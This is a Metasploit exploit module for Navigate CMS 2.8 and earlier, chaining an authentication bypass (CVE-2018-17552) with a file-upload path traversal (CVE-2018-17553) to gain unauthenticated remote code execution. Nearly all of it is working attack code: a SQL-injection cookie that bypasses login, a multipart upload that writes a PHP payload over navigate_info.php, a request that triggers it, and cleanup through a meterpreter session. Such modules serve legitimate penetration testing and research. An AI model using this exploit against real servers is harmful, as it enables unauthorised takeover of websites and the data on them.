##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Navigate CMS Unauthenticated Remote Code Execution',
      'Description' => %q(
      This module exploits insufficient sanitization in the database::protect
      method, of Navigate CMS versions 2.8 and prior, to bypass authentication.

      It then uses a path traversal vulnerability in navigate_upload.php that
      allows authenticated users to upload PHP files to arbitrary locations.
      Together these vulnerabilities allow an unauthenticated attacker to
      execute arbitrary PHP code remotely.

      This module was tested against Navigate CMS 2.8.
      ),
      'Author' =>
        [
          'Pyriphlegethon' # Discovery / msf module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2018-17552'], # Authentication bypass
          ['CVE', '2018-17553']  # File upload
        ],
      'Privileged' => false,
      'Platform' => ['php'],
      'Arch' => ARCH_PHP,
      'Payload' => {},
      'Targets' =>
        [
          ['Automatic', {}]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Sep 26 2018'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base Navigate CMS directory path', '/navigate/'])
      ]
    )
  end

  def login_bypass
    send_request_cgi(
      'method' => 'POST',
      'cookie' => 'navigate-user=\" OR TRUE--%20',
      'uri' => normalize_uri(target_uri.path, '/login.php')
    )
  end

  def check
    check = login_bypass

    if check &&
       check.code == 302
      return CheckCode::Vulnerable
    end

    return CheckCode::Safe
  end

  def exploit
    init = login_bypass

    fail_with(Failure::Unreachable, 'Unable to reach target') unless init

    session_id = init.get_cookies_parsed
                     .values.select { |v| v.to_s =~ /NVSID_/ }.first.first

    if init.code == 302 && session_id
      print_good('Login bypass successful')
    else
      fail_with(Failure::NoAccess, 'Login bypass failed')
    end

    php = %(<?php #{payload.encoded} ?>)
    data = Rex::MIME::Message.new
    data.add_part(php, 'image/jpeg', nil,
      "form-data; name=\"file\"; filename=\"#{rand_text_alphanumeric(10..15)}\"")
    data_post = data.to_s

    upload = send_request_cgi(
      'method' => 'POST',
      'cookie' => init.get_cookies,
      'vars_get' => Hash[{
        'session_id' => session_id,
        'engine' => 'picnik',
        'id' => '../../../navigate_info.php'
      }.to_a.shuffle],
      'uri' => normalize_uri(target_uri.path, '/navigate_upload.php'),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data_post
    )

    fail_with(Failure::Unreachable, 'Unable to reach target') unless upload
    fail_with(Failure::Unknown, 'Upload unsuccessful') unless upload.code == 200

    print_good('Upload successful')

    print_status('Triggering payload...')
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/navigate_info.php')
    )
  end

  def on_new_session(session)
    super
    if session.type != 'meterpreter'
      print_error('Unable to restore navigate_info.php')
      return
    end

    session.core.use('stdapi') if !session.ext.aliases.include?('stdapi')

    begin
      session.fs.file.open('navigate_info.php', 'w').write("<?php\n\nphpinfo();\n\n?>")
    rescue
      print_error('Unable to restore navigate_info.php')
    end
  end
end
